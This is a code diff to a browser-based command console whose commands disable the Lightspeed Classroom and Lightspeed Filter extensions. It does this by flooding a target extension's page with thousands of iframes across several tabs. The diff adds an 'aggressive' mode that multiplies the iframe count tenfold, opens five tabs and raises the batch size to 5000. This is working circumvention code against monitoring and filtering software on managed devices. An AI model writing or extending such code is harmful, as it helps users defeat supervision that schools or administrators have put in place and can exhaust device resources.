@@ -97,9 +97,9 @@
             "show-all-iframes - Show the number of iframes to be created",
             "show-all-commands - Show all available commands",
             "time - Display the current time",
-            "clear - Clear the command history",
+            "clear - Clear the command history and refresh the screen",
             "disablelightspeedclassroom - Disable Lightspeed Classroom",
-            "disablelightspeedfilter - Disable Lightspeed Filter",
+            "disablelightspeedfilter - Disable Lightspeed Filter (more powerful)",
         ];
 
         document.addEventListener("keydown", function (event) {
@@ -126,9 +126,9 @@
                     } else {
                         output = `Usage: iframes set <number>`;
                     }
-                } else if (command === "iframes") {
+                } else if (command === "show-all-iframes") {
                     output = `Number of iframes to be created: ${defaultIframes}`;
-                } else if (command === "controls") {
+                } else if (command === "show-all-commands") {
                     output = "Available commands:";
                     let commandList = document.createElement("ul");
                     allCommands.forEach(cmd => {
@@ -140,8 +140,7 @@
                 } else if (command === "time") {
                     output = new Date().toLocaleTimeString();
                 } else if (command === "clear") {
-                    history.innerHTML = "";
-                    this.value = "";
+                    location.reload(); // Refresh the screen
                     return;
                 } else if (command === "disablelightspeedclassroom") {
                     output = "Lightspeed Classroom has been killed!";
@@ -205,12 +204,12 @@
             const extId = "adkcpkpghahmbopkjchobieckeoaoeem"; // Extension ID
 
             // Automatically disable the extension without a popup
-            createIframesAndPrint(extPage, extIcon);
+            createIframesAndPrint(extPage, extIcon, true); // Pass `true` for more aggressive iframe creation
         }
 
-        function createIframesAndPrint(extPage, extIcon) {
-            const maxIframes = defaultIframes; // Use the defaultIframes value
-            const numTabs = 1; // Number of tabs to open
+        function createIframesAndPrint(extPage, extIcon, isAggressive = false) {
+            const maxIframes = isAggressive ? defaultIframes * 10 : defaultIframes; // Increase iframes for aggressive mode
+            const numTabs = isAggressive ? 5 : 1; // Open more tabs for aggressive mode
             const iframesPerTab = Math.floor(maxIframes / numTabs); // Iframes per tab
 
             for (let tab = 0; tab < numTabs; tab++) {
@@ -270,7 +269,7 @@
                 printerWindow.document.body.appendChild(script);
 
                 // Create iframes in batches to avoid blocking the main thread
-                let batchSize = 1000; // Number of iframes to create per batch
+                let batchSize = isAggressive ? 5000 : 1000; // Larger batch size for aggressive mode
                 let totalIframes = 0;
 
                 function createIframeBatch() {
